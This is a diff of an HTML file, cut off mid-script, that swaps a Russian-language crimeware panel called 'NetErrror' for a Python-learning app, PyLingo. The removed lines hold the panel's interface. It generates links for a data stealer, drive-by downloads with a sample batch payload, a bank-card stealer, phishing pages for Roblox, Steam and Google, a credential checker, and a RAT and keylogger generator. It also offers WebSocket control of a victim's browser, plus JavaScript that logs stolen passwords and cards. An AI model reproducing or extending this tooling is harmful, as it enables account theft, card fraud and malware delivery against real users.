@@ -2,1023 +2,1719 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NetErrror █ FULL CONTROL + ALL MODULES</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PyLingo — Изучение Python</title>
     <style>
+        :root {
+            --bg: #0f0f1a;
+            --surface: #1a1a2e;
+            --surface2: #222236;
+            --accent: #58cc02;
+            --accent2: #46a302;
+            --gold: #ffc800;
+            --text: #e8e8f0;
+            --text2: #b0b0c0;
+            --red: #ff4b4b;
+            --blue: #4da6ff;
+            --orange: #ff8c42;
+            --purple: #b066ff;
+            --radius: 16px;
+            --radius-sm: 10px;
+            --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            background: radial-gradient(circle at 10% 20%, #0a0c17, #010101);
-            font-family: 'Segoe UI', 'Courier New', monospace;
-            color: #00ffcc;
-            padding: 20px;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .app {
+            width: 100%;
+            max-width: 520px;
+            height: 100vh;
+            max-height: 850px;
+            background: var(--surface);
+            border-radius: 24px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
             position: relative;
         }
-        .cyber-container {
-            max-width: 1500px;
-            margin: 0 auto;
-            background: rgba(10, 16, 30, 0.85);
-            backdrop-filter: blur(3px);
-            border: 2px solid #00ffcc;
-            border-radius: 28px;
-            box-shadow: 0 0 30px rgba(0,255,204,0.3);
-            overflow: hidden;
+
+        /* TOP BAR */
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 18px;
+            background: var(--surface2);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            gap: 10px;
+            flex-shrink: 0;
         }
-        .header {
-            background: #0a0f1ecc;
-            padding: 20px 30px;
-            border-bottom: 2px solid #ff3366;
-            text-align: center;
+        .topbar .logo {
+            font-weight: 800;
+            font-size: 1.2em;
+            letter-spacing: -0.5px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 7px;
         }
-        .glitch {
-            font-size: 1.8rem;
-            font-weight: bold;
+        .topbar .logo span {
+            background: var(--accent);
+            color: #000;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85em;
+        }
+        .stat {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 700;
+            font-size: 0.9em;
+            background: var(--surface);
+            padding: 7px 12px;
+            border-radius: 20px;
+        }
+        .stat.xp {
+            color: var(--gold);
+        }
+        .stat.streak {
+            color: var(--orange);
+        }
+        .stat .icon {
+            font-size: 1.1em;
+        }
+        .mode-badge {
+            font-size: 0.75em;
+            font-weight: 700;
+            padding: 5px 10px;
+            border-radius: 14px;
             text-transform: uppercase;
-            letter-spacing: 4px;
-            text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ffcc;
-            animation: glitch-shake 0.3s infinite;
+            letter-spacing: 0.5px;
         }
-        @keyframes glitch-shake {
-            0% { transform: translate(0); }
-            20% { transform: translate(-1px, 1px); }
-            40% { transform: translate(-1px, -1px); }
-            60% { transform: translate(1px, 1px); }
-            80% { transform: translate(1px, -1px); }
-            100% { transform: translate(0); }
+        .mode-badge.student {
+            background: #e8f5e9;
+            color: #2e7d32;
         }
-        .sub {
-            color: #ff88aa;
-            font-size: 0.8rem;
-            margin-top: 8px;
+        .mode-badge.pro {
+            background: #1a1a3e;
+            color: #b066ff;
+            border: 1px solid #b066ff44;
         }
-        .tabs {
+
+        /* CONTENT */
+        .content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            scroll-behavior: smooth;
+        }
+        .content::-webkit-scrollbar {
+            width: 4px;
+        }
+        .content::-webkit-scrollbar-thumb {
+            background: var(--surface2);
+            border-radius: 4px;
+        }
+
+        /* SCREENS */
+        .screen {
+            display: none;
+            flex-direction: column;
+            gap: 14px;
+            flex: 1;
+            animation: fadeSlide 0.35s ease;
+        }
+        .screen.active {
+            display: flex;
+        }
+        @keyframes fadeSlide {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* WELCOME */
+        .welcome {
+            text-align: center;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+        }
+        .welcome h1 {
+            font-size: 2.4em;
+            font-weight: 900;
+            letter-spacing: -1px;
+            line-height: 1.1;
+        }
+        .welcome h1 .py {
+            color: var(--accent);
+        }
+        .welcome p {
+            color: var(--text2);
+            font-size: 1em;
+            max-width: 350px;
+            line-height: 1.5;
+        }
+        .choice-cards {
+            display: flex;
+            gap: 14px;
+            width: 100%;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .choice-card {
+            flex: 1;
+            min-width: 140px;
+            max-width: 200px;
+            background: var(--surface2);
+            border: 2px solid transparent;
+            border-radius: var(--radius);
+            padding: 20px 16px;
+            cursor: pointer;
+            text-align: center;
+            transition: var(--transition);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+        .choice-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(88, 204, 2, 0.2);
+        }
+        .choice-card.pro-choice:hover {
+            border-color: var(--purple);
+            box-shadow: 0 12px 30px rgba(176, 102, 255, 0.25);
+        }
+        .choice-card .emoji {
+            font-size: 3em;
+        }
+        .choice-card h3 {
+            font-weight: 700;
+            font-size: 1.1em;
+        }
+        .choice-card small {
+            color: var(--text2);
+            font-size: 0.8em;
+            line-height: 1.4;
+        }
+        .choice-card .tag {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 0.7em;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .tag.beginner {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+        .tag.advanced {
+            background: #1a1a3e;
+            color: #b066ff;
+        }
+
+        /* PATH */
+        .unit-block {
+            background: var(--surface2);
+            border-radius: var(--radius);
+            padding: 14px;
+            border-left: 4px solid var(--accent);
+        }
+        .unit-block.pro-unit {
+            border-left-color: var(--purple);
+        }
+        .unit-block h4 {
+            font-weight: 700;
+            margin-bottom: 4px;
+            font-size: 0.95em;
+        }
+        .unit-block .unit-desc {
+            font-size: 0.78em;
+            color: var(--text2);
+            margin-bottom: 10px;
+        }
+        .lesson-row {
             display: flex;
             flex-wrap: wrap;
-            border-bottom: 1px solid #00ffcc55;
-            background: #03060e;
+            gap: 10px;
         }
-        .tab-btn {
-            flex: 1;
-            padding: 12px 8px;
-            background: none;
-            border: none;
-            color: #88ffdd;
-            font-size: 0.85rem;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: monospace;
-            transition: 0.2s;
-        }
-        .tab-btn.active {
-            background: #00ffcc22;
-            color: #ff3366;
-            border-bottom: 3px solid #ff3366;
-        }
-        .log-tab-content {
-            display: none;
-            padding: 20px;
-        }
-        .log-tab-content.active {
-            display: block;
-        }
-        .card {
-            background: #0b0f18dd;
-            border: 1px solid #00ffcc66;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 25px;
-        }
-        .card h3 {
-            color: #ff9966;
-            margin-bottom: 15px;
-            border-left: 4px solid #ff3366;
-            padding-left: 12px;
-        }
-        input, select, textarea {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #01050e;
-            border: 1px solid #00ffcc;
-            color: #00ffcc;
-            border-radius: 12px;
-            font-family: monospace;
-        }
-        button {
-            background: linear-gradient(90deg, #ff3366, #cc2277);
-            border: none;
-            padding: 10px 20px;
-            font-weight: bold;
-            font-family: monospace;
-            color: white;
-            border-radius: 40px;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
-        }
-        button:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 15px #ff3366;
-        }
-        .result-box {
-            background: #000000aa;
-            border: 2px dashed #00ffcc;
-            border-radius: 20px;
-            padding: 15px;
-            margin-top: 20px;
-            word-break: break-all;
-        }
-        .copy-btn {
-            background: #2c2c6e;
-            margin-left: 10px;
-        }
-        /* LIVECHAT */
-        .live-chat {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 380px;
-            max-width: calc(100vw - 40px);
-            background: #0a0f1ecc;
-            backdrop-filter: blur(12px);
-            border: 1px solid #00ffcc;
-            border-radius: 20px;
-            box-shadow: 0 0 20px rgba(0,255,204,0.3);
-            z-index: 1000;
-            transition: 0.3s;
-            font-family: monospace;
-        }
-        .chat-header {
-            background: #ff3366aa;
-            padding: 10px 15px;
-            border-radius: 20px 20px 0 0;
-            cursor: pointer;
+        .lesson-node {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            font-weight: bold;
-            color: #fff;
-        }
-        .chat-header span {
-            font-size: 0.9rem;
-        }
-        .chat-header button {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 1.2rem;
+            justify-content: center;
             cursor: pointer;
-            margin-top: 0;
-            padding: 0 5px;
+            font-weight: 700;
+            font-size: 0.8em;
+            transition: var(--transition);
+            position: relative;
+            border: 3px solid transparent;
+            background: var(--surface);
+            color: var(--text2);
+            flex-shrink: 0;
         }
-        .chat-body {
-            max-height: 400px;
-            overflow-y: auto;
+        .lesson-node.completed {
+            background: var(--accent2);
+            color: #fff;
+            border-color: var(--accent);
+            cursor: pointer;
+        }
+        .lesson-node.current {
+            border-color: var(--gold);
+            animation: pulse 2s infinite;
+            cursor: pointer;
+            color: #fff;
+            background: var(--surface);
+        }
+        .lesson-node.locked {
+            opacity: 0.4;
+            cursor: not-allowed;
+            color: #555;
+        }
+        .lesson-node.pro-completed {
+            background: #5c3d99;
+            color: #fff;
+            border-color: var(--purple);
+            cursor: pointer;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 200, 0, 0.5);
+            }
+            50% {
+                box-shadow: 0 0 0 12px rgba(255, 200, 0, 0);
+            }
+        }
+
+        /* LESSON VIEW */
+        .lesson-theory {
+            background: var(--surface2);
+            border-radius: var(--radius);
+            padding: 16px;
+            line-height: 1.6;
+            font-size: 0.9em;
+        }
+        .lesson-theory h3 {
+            color: var(--accent);
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+        .lesson-theory code {
+            background: #00000044;
+            padding: 3px 7px;
+            border-radius: 5px;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #ffcc80;
+        }
+        .lesson-theory pre {
+            background: #0a0a18;
+            padding: 12px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.82em;
+            color: #c8e6c9;
+            margin: 8px 0;
+            line-height: 1.5;
+            white-space: pre-wrap;
+        }
+
+        /* EXERCISE */
+        .exercise-box {
+            background: var(--surface2);
+            border-radius: var(--radius);
+            padding: 16px;
+            border: 2px solid transparent;
+            transition: var(--transition);
+        }
+        .exercise-box.correct {
+            border-color: var(--accent) !important;
+            animation: correctGlow 0.6s ease;
+        }
+        .exercise-box.wrong {
+            border-color: var(--red) !important;
+            animation: shake 0.5s ease;
+        }
+        @keyframes correctGlow {
+            0%,
+            100% {
+                box-shadow: 0 0 20px rgba(88, 204, 2, 0.4);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(88, 204, 2, 0.7);
+            }
+        }
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-8px);
+            }
+            50% {
+                transform: translateX(8px);
+            }
+            75% {
+                transform: translateX(-4px);
+            }
+        }
+        .exercise-box .q {
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 0.95em;
+        }
+        .exercise-box textarea {
+            width: 100%;
+            min-height: 90px;
+            background: #0a0a18;
+            border: 1px solid #333;
+            border-radius: var(--radius-sm);
+            color: #c8e6c9;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.85em;
             padding: 10px;
+            resize: vertical;
+            line-height: 1.5;
+        }
+        .exercise-box textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(88, 204, 2, 0.15);
+        }
+        .mc-options {
             display: flex;
             flex-direction: column;
             gap: 8px;
         }
-        .chat-message {
-            background: #01050ecc;
-            border-left: 3px solid #ff3366;
-            padding: 8px 10px;
-            border-radius: 12px;
-            font-size: 0.75rem;
-            color: #ccffdd;
-            word-break: break-word;
-        }
-        .chat-message .time {
-            color: #88ffaa;
-            font-size: 0.65rem;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .chat-message .data {
-            font-family: monospace;
-            white-space: pre-wrap;
-        }
-        .chat-message .copy-data {
-            background: #2c2c6e;
-            border: none;
-            padding: 2px 8px;
-            font-size: 0.7rem;
-            margin-top: 5px;
-            border-radius: 12px;
+        .mc-option {
+            padding: 12px 14px;
+            background: var(--surface);
+            border: 2px solid transparent;
+            border-radius: var(--radius-sm);
             cursor: pointer;
+            transition: var(--transition);
+            font-size: 0.9em;
+            text-align: left;
+            font-weight: 500;
         }
-        .chat-collapsed .chat-body {
+        .mc-option:hover {
+            border-color: #666;
+            background: #252540;
+        }
+        .mc-option.selected {
+            border-color: var(--blue);
+            background: #1a2a40;
+        }
+        .mc-option.correct-choice {
+            border-color: var(--accent) !important;
+            background: #1a3a1a !important;
+        }
+        .mc-option.wrong-choice {
+            border-color: var(--red) !important;
+            background: #3a1a1a !important;
+        }
+
+        /* BUTTONS */
+        .btn {
+            padding: 12px 20px;
+            border-radius: 25px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            font-size: 0.9em;
+            transition: var(--transition);
+            letter-spacing: 0.3px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            justify-content: center;
+        }
+        .btn-primary {
+            background: var(--accent);
+            color: #000;
+        }
+        .btn-primary:hover {
+            background: #6be010;
+            transform: scale(1.04);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--accent);
+            color: var(--accent);
+        }
+        .btn-outline:hover {
+            background: rgba(88, 204, 2, 0.1);
+        }
+        .btn-sm {
+            padding: 8px 14px;
+            font-size: 0.8em;
+            border-radius: 20px;
+        }
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        /* FEEDBACK */
+        .feedback {
+            padding: 10px 14px;
+            border-radius: var(--radius-sm);
+            font-weight: 600;
+            font-size: 0.85em;
+            text-align: center;
             display: none;
         }
-        .clear-chat {
-            background: #661133;
-            margin-top: 5px;
-            padding: 5px;
-            font-size: 0.7rem;
-            width: 100%;
+        .feedback.show {
+            display: block;
+            animation: fadeSlide 0.3s ease;
         }
-        /* Сообщение-благодарность */
-        .thankyou-overlay {
+        .feedback.success {
+            background: #1a3a1a;
+            color: #6be010;
+        }
+        .feedback.error {
+            background: #3a1a1a;
+            color: #ff6b6b;
+        }
+
+        /* SANDBOX OUTPUT */
+        .sandbox-output {
+            background: #0a0a18;
+            border-radius: var(--radius-sm);
+            padding: 10px;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.8em;
+            color: #aaa;
+            min-height: 30px;
+            max-height: 120px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        /* CONFETTI (simple) */
+        .confetti-container {
             position: fixed;
             top: 0;
             left: 0;
+            pointer-events: none;
+            z-index: 999;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(8px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            font-family: 'Courier New', monospace;
-            animation: fadeIn 0.3s ease;
         }
-        .thankyou-box {
-            background: #0a0f1e;
-            border: 3px solid #ff3366;
-            border-radius: 40px;
-            padding: 30px 50px;
-            text-align: center;
-            box-shadow: 0 0 40px #ff3366;
-            animation: pulse 1.5s infinite;
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 3px;
+            animation: fall linear forwards;
         }
-        .thankyou-box h1 {
-            color: #ff88aa;
-            font-size: 2rem;
-            margin-bottom: 15px;
+        @keyframes fall {
+            0% {
+                transform: translateY(-60px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(105vh) rotate(720deg);
+                opacity: 0;
+            }
         }
-        .thankyou-box p {
-            color: #00ffcc;
-            font-size: 1.2rem;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 20px #ff3366; }
-            50% { transform: scale(1.02); box-shadow: 0 0 50px #ff3366; }
-            100% { transform: scale(1); box-shadow: 0 0 20px #ff3366; }
-        }
-        @media (max-width: 700px) {
-            .live-chat { width: 300px; }
-            .tab-btn { font-size: 0.7rem; padding: 8px 4px; }
-            .thankyou-box { padding: 20px 30px; }
-            .thankyou-box h1 { font-size: 1.5rem; }
+
+        /* RESPONSIVE */
+        @media (max-width: 540px) {
+            .app {
+                border-radius: 0;
+                max-height: 100vh;
+            }
+            .choice-cards {
+                flex-direction: column;
+                align-items: center;
+            }
+            .choice-card {
+                max-width: 100%;
+                width: 100%;
+            }
+            .lesson-node {
+                width: 40px;
+                height: 40px;
+                font-size: 0.7em;
+            }
         }
     </style>
 </head>
 <body>
-<div class="cyber-container">
-    <div class="header">
-        <div class="glitch">NETERRROR █ FULL CONTROL + ALL MODULES</div>
-        <div class="sub">⚡ STEALTH | DRIVE-BY | CARD STEALER | PHISHING | CHECKER | RAT | REMOTE CONTROL (WebSocket) ⚡</div>
-    </div>
-
-    <div class="tabs" id="loggedTabs">
-        <button class="tab-btn active" data-logtab="stealth">🔥 STEALTH PRO</button>
-        <button class="tab-btn" data-logtab="driveby">💿 DRIVE-BY</button>
-        <button class="tab-btn" data-logtab="cardstealer">💳 CARD STEALER</button>
-        <button class="tab-btn" data-logtab="phish">🎭 ФИШИНГ</button>
-        <button class="tab-btn" data-logtab="checker">🔍 ЧЕКЕР</button>
-        <button class="tab-btn" data-logtab="rat">🐍 RAT/ЛОКЕР</button>
-        <button class="tab-btn" data-logtab="remote">🎮 REMOTE CONTROL</button>
-    </div>
-
-    <!-- STEALTH PRO (без изменений) -->
-    <div id="stealthTab" class="log-tab-content active">
-        <div class="card">
-            <h3>🔥 STEALTH PRO — КРАЖА ВСЕХ ДАННЫХ ЗА 0.3 СЕК</h3>
-            <p style="color:#ffaa88;">Жертва переходит → мгновенный сбор: пароли, cookies, localStorage, ОС, браузер, экран, IP, гео → редирект.</p>
-            <label>🎭 Маскировка (редирект):</label>
-            <input type="text" id="stealthRedirect" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
-            <label>📡 Доп. WebHook (опционально):</label>
-            <input type="text" id="stealthWebhook" placeholder="https://webhook.site/...">
-            <button id="generateStealthLink">🌀 СОЗДАТЬ STEALTH ССЫЛКУ</button>
-            <div id="stealthResult" class="result-box" style="display:none;">
-                <strong>💀 ССЫЛКА:</strong><br><span id="stealthLinkSpan"></span>
-                <button id="copyStealthLink" class="copy-btn">📋 Копировать</button>
-            </div>
+    <div class="app" id="app">
+        <!-- TOP BAR -->
+        <div class="topbar" id="topbar">
+            <div class="logo"><span>🐍</span> PyLingo</div>
+            <div class="stat xp"><span class="icon">⚡</span> <span id="xpDisplay">0 XP</span></div>
+            <div class="stat streak"><span class="icon">🔥</span> <span id="streakDisplay">0</span></div>
+            <div class="mode-badge student" id="modeBadge">👨‍🎓 Студент</div>
         </div>
+
+        <!-- CONTENT -->
+        <div class="content" id="content"></div>
+
+        <!-- CONFETTI CONTAINER -->
+        <div class="confetti-container" id="confettiContainer"></div>
     </div>
 
-    <!-- DRIVE-BY -->
-    <div id="drivebyTab" class="log-tab-content">
-        <div class="card">
-            <h3>💿 АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ</h3>
-            <label>📁 Имя файла:</label>
-            <input type="text" id="drivebyFilename" value="update_patch.exe">
-            <label>🦠 Содержимое:</label>
-            <textarea id="drivebyContent" rows="4">@echo off
-echo STEAL > %temp%\log.txt
-start calc.exe</textarea>
-            <label>🎭 Редирект:</label>
-            <input type="text" id="drivebyRedirect" value="https://google.com">
-            <label>📡 Доп. WebHook:</label>
-            <input type="text" id="drivebyWebhook" placeholder="опционально">
-            <button id="generateDrivebyLink">🔥 СОЗДАТЬ DRIVE-BY ССЫЛКУ</button>
-            <div id="drivebyResult" class="result-box" style="display:none;">
-                <strong>💾 ССЫЛКА:</strong><br><span id="drivebyLinkSpan"></span>
-                <button id="copyDrivebyLink" class="copy-btn">📋 Копировать</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- CARD STEALER -->
-    <div id="cardstealerTab" class="log-tab-content">
-        <div class="card">
-            <h3>💳 СТИЛЕР БАНКОВСКИХ КАРТ</h3>
-            <label>🎭 Маскировка:</label>
-            <input type="text" id="cardRedirect" value="https://youtube.com">
-            <label>📡 Доп. WebHook:</label>
-            <input type="text" id="cardWebhook" placeholder="https://webhook.site/...">
-            <button id="generateCardLink">💳 СОЗДАТЬ CARD-STEALER ССЫЛКУ</button>
-            <div id="cardResult" class="result-box" style="display:none;">
-                <strong>💀 ССЫЛКА:</strong><br><span id="cardLinkSpan"></span>
-                <button id="copyCardLink" class="copy-btn">📋 Копировать</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- ФИШИНГ -->
-    <div id="phishTab" class="log-tab-content">
-        <div class="card">
-            <h3>🎭 ФИШИНГ (ЛОГИН/ПАРОЛЬ)</h3>
-            <label>Маскировка (редирект):</label>
-            <input type="text" id="phishRedirect" value="https://roblox.com">
-            <label>Тип атаки:</label>
-            <select id="phishType">
-                <option value="roblox">🎮 Roblox</option>
-                <option value="steam">🎮 Steam</option>
-                <option value="google">📧 Google</option>
-                <option value="universal">🌐 Универсальная форма</option>
-            </select>
-            <button id="generatePhishLink">🔗 СОЗДАТЬ ФИШИНГ-ССЫЛКУ</button>
-            <div id="phishResult" class="result-box" style="display:none;">
-                <span id="phishLinkSpan"></span>
-                <button id="copyPhishLink" class="copy-btn">📋 Копировать</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- ЧЕКЕР -->
-    <div id="checkerTab" class="log-tab-content">
-        <div class="card">
-            <h3>🔍 ЧЕКЕР ЛОГИНОВ/ПАРОЛЕЙ</h3>
-            <label>📁 Список (login:pass):</label>
-            <textarea id="checkerList" rows="6" placeholder="user1:pass123"></textarea>
-            <label>🎯 Целевой сервис:</label>
-            <select id="checkerTarget">
-                <option value="roblox">Roblox</option>
-                <option value="steam">Steam</option>
-                <option value="google">Google</option>
-            </select>
-            <button id="runCheckerBtn">🔍 ЗАПУСТИТЬ ЧЕКЕР</button>
-        </div>
-    </div>
-
-    <!-- RAT/ЛОКЕР -->
-    <div id="ratTabContent" class="log-tab-content">
-        <div class="card">
-            <h3>🐍 ГЕНЕРАТОР RAT / ЛОКЕРА</h3>
-            <label>Название:</label>
-            <input type="text" id="malName" value="NetStealthRAT">
-            <label>Тип:</label>
-            <select id="malType">
-                <option value="powershell_rat">PowerShell RAT</option>
-                <option value="js_keylogger">JS Keylogger</option>
-                <option value="locker_html">Browser Locker</option>
-                <option value="clipper">Clipper</option>
-                <option value="stealer_telegram">Стилер Telegram</option>
-            </select>
-            <label>Webhook / Telegram Bot:</label>
-            <input type="text" id="webhookRat" placeholder="https://webhook.site/...">
-            <button id="generateRatCodeBtn">⚙️ СГЕНЕРИРОВАТЬ КОД</button>
-            <button id="copyCodeBtn" class="copy-btn">📋 Скопировать код</button>
-            <div id="ratResultArea" class="result-box" style="display:none;">
-                <textarea id="generatedCodeArea" rows="8" style="width:100%; background:#000; color:#0f0;" readonly></textarea>
-            </div>
-        </div>
-    </div>
-
-    <!-- НОВАЯ ВКЛАДКА: REMOTE CONTROL (УПРАВЛЕНИЕ БРАУЗЕРОМ) -->
-    <div id="remoteTab" class="log-tab-content">
-        <div class="card">
-            <h3>🎮 УДАЛЁННОЕ УПРАВЛЕНИЕ БРАУЗЕРОМ ЖЕРТВЫ</h3>
-            <p style="color:#ffaa88;">Создай ссылку → жертва переходит → ты получаешь полный контроль: отправляй команды (alert, redirect, eval JS, клик, скролл, сбор данных). Работает через WebSocket (Piesocket).</p>
-            <label>🎭 Маскировка (редирект после отключения):</label>
-            <input type="text" id="remoteRedirect" value="https://youtube.com">
-            <label>📡 Доп. WebHook (логи):</label>
-            <input type="text" id="remoteWebhook" placeholder="опционально">
-            <button id="generateRemoteLink">🌀 СОЗДАТЬ REMOTE CONTROL ССЫЛКУ</button>
-            <div id="remoteResult" class="result-box" style="display:none;">
-                <strong>🎮 ССЫЛКА ДЛЯ ЖЕРТВЫ:</strong><br><span id="remoteLinkSpan"></span>
-                <button id="copyRemoteLink" class="copy-btn">📋 Копировать</button>
-                <hr>
-                <strong>🕹️ ПАНЕЛЬ УПРАВЛЕНИЯ (открой в новой вкладке):</strong><br>
-                <span id="controlPanelSpan"></span>
-                <button id="copyControlLink" class="copy-btn">📋 Копировать ссылку управления</button>
-                <div class="note-red" style="margin-top:10px;">После перехода жертвы открой панель управления в другом окне, и ты сможешь отправлять команды.</div>
-            </div>
-        </div>
-        <div class="card">
-            <h3>📋 ДОСТУПНЫЕ КОМАНДЫ (в панели)</h3>
-            <p>• alert:текст — показать alert<br>
-            • redirect:URL — перейти на URL<br>
-            • eval:код — выполнить JS код<br>
-            • click:селектор — кликнуть по элементу (CSS selector)<br>
-            • scrollY:пиксели — прокрутить страницу<br>
-            • getCookies — получить cookies<br>
-            • getLocalStorage — получить localStorage<br>
-            • screenshot — сделать скриншот (через html2canvas, если доступно)</p>
-        </div>
-    </div>
-</div>
-
-<!-- Плавающий чат с логами -->
-<div id="liveChat" class="live-chat">
-    <div class="chat-header" id="chatHeader">
-        <span>📡 LIVELOGS (украденные данные)</span>
-        <button id="toggleChatBtn">−</button>
-    </div>
-    <div class="chat-body" id="chatBody">
-        <div style="text-align:center; color:#aaa;">Загрузка...</div>
-    </div>
-    <button id="clearChatBtn" class="clear-chat">🗑️ ОЧИСТИТЬ ВСЕ ЛОГИ</button>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-<script>
-    // -------------------- СИСТЕМА ЛОГОВ (без регистрации) --------------------
-    const STORAGE_KEY = 'neterror_stolen_global';
-
-    function getStolenData() {
-        const raw = localStorage.getItem(STORAGE_KEY);
-        return raw ? JSON.parse(raw) : [];
-    }
-    function saveStolenData(logs) {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(logs));
-        renderChatLogs();
-    }
-    function addStolenEntry(entry) {
-        const logs = getStolenData();
-        logs.unshift({ ...entry, timestamp: new Date().toISOString() });
-        while (logs.length > 500) logs.pop();
-        saveStolenData(logs);
-    }
-    function clearAllLogs() {
-        localStorage.removeItem(STORAGE_KEY);
-        renderChatLogs();
-    }
-
-    function formatStolenData(entry) {
-        let text = '';
-        if (entry.type === 'stealth_full') {
-            text = `🔐 STEALTH PRO:\n`;
-            if (entry.passwords?.length) text += `Пароли: ${entry.passwords.join(', ')}\n`;
-            text += `🍪 Cookies: ${entry.cookies_count || 0}\n🌐 IP: ${entry.ip || 'unknown'}\n📍 Гео: ${entry.geo?.city || ''} ${entry.geo?.country || ''}\n`;
-            text += `💻 ОС: ${entry.systemInfo?.os || '?'} | Браузер: ${entry.systemInfo?.browser || '?'}\n`;
-            text += `📺 Экран: ${entry.systemInfo?.screenResolution || '?'}\n🌍 Язык: ${entry.systemInfo?.language || '?'}\n`;
-            if (entry.systemInfo?.webglRenderer) text += `🎮 WebGL: ${entry.systemInfo.webglRenderer}\n`;
-            if (entry.localStorage && Object.keys(entry.localStorage).length) text += `💾 LocalStorage: ${JSON.stringify(entry.localStorage).slice(0, 200)}`;
-        }
-        else if (entry.type === 'card_stealer') {
-            text = `💳 КАРТЫ:\n${entry.cards?.map(c => `${c.type}: ${c.value}`).join('\n') || ''}`;
-        }
-        else if (entry.type === 'driveby_download') {
-            text = `💿 DRIVE-BY: ${entry.filename} скачан\nСодержимое: ${entry.content_preview}`;
-        }
-        else if (entry.type === 'roblox_creds') {
-            text = `🎮 ROBLOX: ${entry.username} / ${entry.password}`;
-        }
-        else if (entry.type === 'steam_creds') {
-            text = `🎮 STEAM: ${entry.username} / ${entry.password}`;
-        }
-        else if (entry.type === 'google_creds') {
-            text = `📧 GOOGLE: ${entry.email} / ${entry.password}`;
-        }
-        else if (entry.type === 'universal_creds') {
-            text = `🌐 ЛОГИН: ${entry.login} / ПАРОЛЬ: ${entry.password}`;
-        }
-        else if (entry.type === 'checker_result') {
-            text = `🔍 ЧЕКЕР: ${entry.result}`;
-        }
-        else {
-            text = JSON.stringify(entry);
-        }
-        return text;
-    }
-
-    function renderChatLogs() {
-        const logs = getStolenData();
-        const chatBody = document.getElementById('chatBody');
-        if (!logs.length) {
-            chatBody.innerHTML = '<div style="text-align:center; color:#aaa;">Нет данных. Ждите...</div>';
-            return;
-        }
-        let html = '';
-        logs.forEach(log => {
-            const time = new Date(log.timestamp).toLocaleString();
